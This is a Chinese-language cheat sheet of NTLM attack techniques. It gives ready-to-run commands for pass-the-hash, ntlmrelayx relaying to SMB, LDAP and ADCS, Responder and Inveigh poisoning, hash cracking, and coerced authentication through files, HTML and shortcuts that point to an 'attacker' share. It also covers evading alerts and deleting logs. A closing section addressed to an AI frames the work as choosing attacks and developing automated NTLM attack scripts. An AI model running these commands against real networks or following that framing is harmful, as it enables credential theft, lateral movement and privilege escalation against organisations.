# NTLM 攻击

NTLM 是 Windows 的传统认证协议，存在多种安全问题和攻击向量。

## NTLM 基础

### 认证流程

**Challenge-Response**：
1. 客户端请求认证
2. 服务器发送 Challenge
3. 客户端使用密码哈希加密 Challenge
4. 服务器验证 Response

### NTLM 版本
- NTLMv1：弱加密，易破解
- NTLMv2：更强加密，仍有漏洞

### 哈希格式
```
username:RID:LM_hash:NTLM_hash:::
```

## Pass-the-Hash (PtH)

### 原理
- 使用 NTLM 哈希直接认证
- 无需明文密码
- 适用于多种协议

### 工具和方法

**Mimikatz**：
```
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:hash /run:cmd
```

**Impacket**：
```bash
psexec.py -hashes :ntlmhash domain/user@target
wmiexec.py -hashes :ntlmhash domain/user@target
smbexec.py -hashes :ntlmhash domain/user@target
```

**CrackMapExec**：
```bash
crackmapexec smb target -u user -H ntlmhash
crackmapexec smb target -u user -H ntlmhash -x "whoami"
```

**Evil-WinRM**：
```bash
evil-winrm -i target -u user -H ntlmhash
```

### 适用协议
- SMB
- WMI
- WinRM
- MSSQL
- RDP（Restricted Admin 模式）

## NTLM 中继

### 原理
- 拦截 NTLM 认证
- 将认证中继到其他服务
- 无需破解密码

### SMB 中继

**ntlmrelayx**：
```bash
# 基础中继
ntlmrelayx.py -t smb://target -smb2support

# 执行命令
ntlmrelayx.py -t smb://target -c "whoami"

# 获取 SAM
ntlmrelayx.py -t smb://target --sam

# Socks 代理
ntlmrelayx.py -tf targets.txt -socks -smb2support
```

**要求**：
- SMB 签名未启用
- 目标主机可达
- 有效的凭证

### HTTP 中继

**中继到 LDAP**：
```bash
ntlmrelayx.py -t ldap://dc.domain.com --escalate-user lowpriv
```

**中继到 ADCS**：
```bash
ntlmrelayx.py -t http://ca.domain.com/certsrv/certfnsh.asp --adcs --template DomainController
```

### LDAP 中继

**创建计算机账户**：
```bash
ntlmrelayx.py -t ldaps://dc.domain.com --add-computer
```

**修改 ACL**：
```bash
ntlmrelayx.py -t ldaps://dc.domain.com --escalate-user user
```

### 跨协议中继
- HTTP to LDAP
- SMB to LDAP
- LDAP to SMB
- HTTP to SMB

## LLMNR/NBT-NS 投毒

### 原理
- 监听 LLMNR/NBT-NS 请求
- 响应名称解析
- 捕获 NTLM 哈希

### Responder

**启动**：
```bash
responder -I eth0 -wrf
```

**参数**：
- -w：启动 WPAD 代理
- -r：启动 NETBIOS 响应
- -f：指纹识别

**捕获哈希**：
- NTLMv1/v2 哈希
- 自动保存到文件
- 可以离线破解

### Inveigh

**PowerShell 版本**：
```powershell
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y
```

**C# 版本**：
```
Inveigh.exe
```

### 中继结合
```bash
# 关闭 Responder 的 SMB/HTTP 服务器
responder -I eth0 -rv

# 启动中继
ntlmrelayx.py -tf targets.txt -smb2support
```

## NTLM 哈希破解

### 在线破解

**Hydra**：
```bash
hydra -l user -P passwords.txt smb://target
```

**CrackMapExec**：
```bash
crackmapexec smb target -u users.txt -p passwords.txt
```

### 离线破解

**Hashcat**：
```bash
# NTLM
hashcat -m 1000 ntlm.txt wordlist.txt

# NTLMv2
hashcat -m 5600 ntlmv2.txt wordlist.txt
```

**John the Ripper**：
```bash
john --format=NT ntlm.txt
john --format=netntlmv2 ntlmv2.txt
```

### 彩虹表
- 预计算哈希表
- 快速查找
- 适用于简单密码

## NTLM 降级攻击

### 强制 NTLMv1

**Responder**：
```bash
responder -I eth0 --lm
```

**优势**：
- NTLMv1 更易破解
- 可以使用彩虹表

### 禁用 SMB 签名
- 中间人攻击
- 修改协商包
- 降低安全性

## NTLM 认证强制

### 强制认证方法

**文件共享**：
```
\\attacker\share
```

**快捷方式**：
```
[InternetShortcut]
URL=file://attacker/share
```

**HTML**：
```html
<img src="file://attacker/share/image.jpg">
```

**Office 文档**：
- 外部链接
- 模板注入

**打印机**：
- 打印机属性
- 驱动程序路径

### 工具

**Farmer**：
- 生成恶意文件
- 多种文件类型

**ntlm_theft**：
```bash
python ntlm_theft.py -g all -s attacker -f test
```

## NTLM 会话劫持

### SMB 会话劫持
- 劫持现有 SMB 会话
- 重用认证

### RDP 会话劫持
- 劫持 RDP 会话
- 无需密码

## NTLM 签名绕过

### SMB 签名
- 检查签名配置
- 寻找未启用签名的主机
- 中继攻击

### LDAP 签名
- LDAP 签名和通道绑定
- 降级攻击
- 中继到 LDAPS

## 防御绕过

### EPA (Extended Protection for Authentication)
- 通道绑定
- 绕过技术

### SMB 签名
- 寻找未启用的主机
- 跨协议中继

### LDAP 签名
- 使用 LDAPS
- 证书认证

## 实战场景

### 内网渗透
1. LLMNR/NBT-NS 投毒捕获哈希
2. 破解或中继哈希
3. 横向移动

### 权限提升
1. 中继到高权限服务
2. 修改 ACL
3. 添加用户到管理组

### 持久化
1. 创建计算机账户
2. 修改委派权限
3. 添加 SPN

## 检测规避

### 避免触发告警
- 控制投毒频率
- 选择性响应
- 避免高价值目标

### 清理痕迹
- 删除日志
- 清除缓存
- 移除临时文件

---

**AI 发挥空间**：
- 根据网络环境选择合适的 NTLM 攻击方法
- 分析网络配置发现中继目标
- 结合多种技术进行 NTLM 攻击
- 开发自动化 NTLM 攻击脚本

**反幻觉提示**：
- 不要假设所有主机都未启用 SMB 签名
- 验证目标网络的 NTLM 配置和防护措施
- 测试攻击方法的实际效果
- 注意 NTLM 攻击可能触发告警
- 某些攻击需要特定网络条件
